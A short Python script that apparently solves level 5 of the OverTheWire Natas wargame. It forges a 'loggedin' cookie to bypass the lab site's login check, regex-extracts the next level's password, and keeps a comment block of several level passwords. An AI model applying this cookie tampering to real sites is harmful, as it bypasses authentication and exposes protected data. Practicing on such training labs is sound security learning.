#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = "http://%s.natas.labs.overthewire.org" % username

cookies = { 'loggedin': '1' }

# response = requests.get(url, auth=(username,password))
session = requests.Session()
response = session.get(url, auth=(username,password), cookies=cookies)

content = response.text

# print(content)
print(re.findall("Access granted. The password for natas6 is (.*)</div>", content)[0])

#
# gtVrDuiDfck831PqWsLEZy5gyDz1clto
# ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
# sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
# Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
# iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
# aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
#
